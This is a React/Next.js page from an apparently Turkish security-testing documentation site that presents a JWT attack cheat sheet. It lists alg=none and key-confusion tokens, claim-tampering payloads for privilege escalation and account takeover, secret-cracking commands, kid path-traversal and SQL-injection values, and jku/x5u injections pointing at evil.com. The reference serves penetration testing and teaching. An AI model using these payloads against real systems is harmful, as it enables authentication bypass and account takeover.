"use client"

import { motion } from "framer-motion"
import { Lock, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "algorithm", title: "Algorithm Attacks", level: 2 },
  { id: "claim", title: "Claim Manipulation", level: 2 },
  { id: "key-attacks", title: "Key Attacks", level: 2 },
  { id: "token-handling", title: "Token Handling", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function JWTPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-red-400 text-sm font-medium mb-4">
            <Lock className="w-4 h-4" />
            <span>Authentication</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">JWT Attacks</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            JSON Web Token&apos;lardaki güvenlik zafiyetleri. Algorithm confusion, signature bypass,
            claim manipulation ve key confusion saldırıları.
          </p>
        </motion.div>

        <Callout type="info" title="JWT Yapısı">
          JWT üç parçadan oluşur: Header.Payload.Signature (base64url encoded).
          jwt.io ile decode edip içeriği inceleyin.
        </Callout>

        <motion.section variants={fadeIn} id="algorithm" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Algorithm Attacks
          </h2>
          <PayloadList
            title="Algorithm Manipulation"
            initialShow={8}
            payloads={[
              { code: `{"alg":"none","typ":"JWT"}`, note: "alg=none → imza kontrolü devre dışı" },
              { code: `{"alg":"None","typ":"JWT"}`, note: "Case variation" },
              { code: `{"alg":"NONE","typ":"JWT"}` },
              { code: `{"alg":"nOnE","typ":"JWT"}` },
              { code: `{"alg":"HS256","typ":"JWT"} → sign with RSA public key`, note: "RS256→HS256 confusion: public key = HMAC secret" },
              { code: `{"alg":"HS384","typ":"JWT"}`, note: "Algorithm downgrade" },
              { code: `{"alg":"HS512","typ":"JWT"}` },
              { code: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.`, note: "Complete alg=none token (empty signature)" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="claim" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Claim Manipulation
          </h2>
          <PayloadList
            title="Payload Tampering"
            initialShow={8}
            payloads={[
              { code: `{"sub":"admin","role":"admin"}`, note: "Role escalation" },
              { code: `{"sub":"victim_id"}`, note: "User ID takeover" },
              { code: `{"sub":"1","iss":"trusted-issuer"}`, note: "Issuer spoofing" },
              { code: `{"exp":9999999999}`, note: "Expiry uzatma (2286 yılı)" },
              { code: `{"aud":"admin-panel"}`, note: "Audience değiştirme" },
              { code: `{"sub":"1","admin":true}`, note: "Admin claim injection" },
              { code: `{"sub":"1","scope":"admin:read admin:write"}`, note: "Scope escalation" },
              { code: `{"sub":"1","email":"admin@target.com"}`, note: "Email claim tampering" },
              { code: `Token without exp claim`, note: "Never-expiring token" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="key-attacks" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Key Attacks
          </h2>
          <PayloadList
            title="Key Confusion & Brute Force"
            initialShow={8}
            payloads={[
              { code: `jwt-cracker <token> -d /usr/share/wordlists/rockyou.txt`, note: "HMAC secret brute force" },
              { code: `hashcat -m 16500 jwt.txt rockyou.txt`, note: "Hashcat JWT crack" },
              { code: `python3 jwt_tool.py <token> -C -d wordlist.txt`, note: "jwt_tool brute force" },
              { code: `{"alg":"RS256"} → {"alg":"HS256"} + sign with leaked public key`, note: "Key confusion attack" },
              { code: `Common weak secrets: secret, password, 123456, changeme`, note: "Default secrets" },
              { code: `{"kid":"../../etc/passwd"}`, note: "KID path traversal" },
              { code: `{"kid":"key1' UNION SELECT 'secret' -- "}`, note: "KID SQL injection" },
              { code: `{"kid":"/dev/null"}`, note: "KID null key → empty secret" },
              { code: `{"jku":"https://evil.com/jwks.json"}`, note: "JKU header injection" },
              { code: `{"x5u":"https://evil.com/cert.pem"}`, note: "X5U header injection" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="token-handling" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Token Handling
          </h2>
          <PayloadList
            title="Token Misuse"
            initialShow={6}
            payloads={[
              { code: `Use access token after logout → still valid?`, note: "Token invalidation check" },
              { code: `Use token from different environment (staging → prod)`, note: "Cross-environment" },
              { code: `Modify token, keep old signature → signature not checked?`, note: "Signature validation check" },
              { code: `Token in URL parameter → log exposure`, note: "Token leakage" },
              { code: `Reuse refresh token multiple times`, note: "Refresh token rotation check" },
              { code: `Use expired token → accepted?`, note: "Expiry validation" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Araçlar">
          1. jwt.io - JWT decode/encode{"\n"}
          2. jwt_tool - comprehensive JWT testing{"\n"}
          3. hashcat -m 16500 - JWT secret cracking{"\n"}
          4. Burp JWT Editor extension{"\n"}
          5. python-jwt - programmatic JWT manipulation
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/auth/oauth"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              OAuth
            </Link>
            <Link
              href="/docs/auth/session"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              Session Management
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
